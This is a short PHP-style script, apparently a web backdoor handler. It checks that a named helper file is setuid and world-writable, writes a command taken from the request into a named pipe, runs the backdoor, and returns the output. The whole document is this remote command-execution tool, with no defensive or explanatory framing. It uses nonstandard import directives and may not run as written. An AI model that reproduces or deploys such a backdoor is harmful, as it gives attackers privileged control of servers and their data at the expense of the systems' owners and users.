<?

!import(execute)
!import(getPerms)

if (getPerms($Q['BACKDOOR']) != '-rwsrwxrwx') return error('nobackdoor');

if ($h = @fopen($Q['PIPE'],'w')){
    fwrite($h,$Q['COMMAND']);
    fclose($h);
    chmod($Q['PIPE'],0777);
    $result = @execute($Q['BACKDOOR']);
    unlink($Q['PIPE']);
    return $result;}
else return error('nopipewrite');


?>
